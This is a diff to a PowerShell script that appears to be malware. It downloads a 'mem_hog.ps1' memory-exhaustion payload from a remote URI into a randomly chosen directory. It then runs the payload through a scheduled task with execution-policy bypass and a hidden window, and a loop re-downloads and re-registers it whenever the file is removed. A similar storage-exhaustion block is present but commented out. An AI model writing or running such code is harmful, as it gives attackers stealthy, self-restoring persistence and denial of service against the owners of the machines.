@@ -17,10 +17,12 @@ $paths = @(
 $idx = Get-Random -Minimum 0 -Maximum $paths.Length
 $memHogPath = $paths[$idx]
 $memHogPath = "$memHogPath\mem_hog.ps1"
+iwr -Uri $memHogUri -OutFile $memHogPath
 
 $idx = Get-Random -Minimum 0 -Maximum $paths.Length
 $storageHogPath = $paths[$idx]
 $storageHogPath = "$storageHogPath\storage_hog.ps1"
+# iwr -Uri $storageHogUri -OutFile $storageHogPath
 
 $threshold = Get-Random -Minimum 65 -Maximum 86
 $idx = Get-Random -Minimum 0 -Maximum $paths.Length
@@ -71,10 +73,24 @@ function CheckTask-And-Recreate {
 while ($true) {
 
     if(-not(Test-Path $memHogPath)){
+        $idx = Get-Random -Minimum 0 -Maximum $paths.Length
+        $memHogPath = $paths[$idx]
+        $memHogPath = "$memHogPath\mem_hog.ps1"
         iwr -Uri $memHogUri -OutFile $memHogPath
+        $memTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $memHogPath"
+        schtasks /change /tn $memHogTaskName /tr $memTaskRunAction
+        schtasks /end /tn $memHogTaskName
+        schtasks /run /tn $memHogTaskName
     }
     # if(-not(Test-Path $storageHogPath)){
+    #     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
+    #     $storageHogPath = $paths[$idx]
+    #     $storageHogPath = "$storageHogPath\storage_hog.ps1"
     #     iwr -Uri $storageHogUri -OutFile $storageHogPath
+    #     $storageTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $storageHogPath"
+    #     schtasks /change /tn $storageHogTaskName /tr $storageTaskRunAction
+    #     schtasks /end /tn $storageHogTaskName
+    #     schtasks /run /tn $storageHogTaskName
     # }
     CheckTask-And-Recreate -taskName $memHogTaskName -taskRunAction $memTaskRunAction
     # CheckTask-And-Recreate -taskName $storageHogTaskName -taskRunAction $storageTaskRunAction
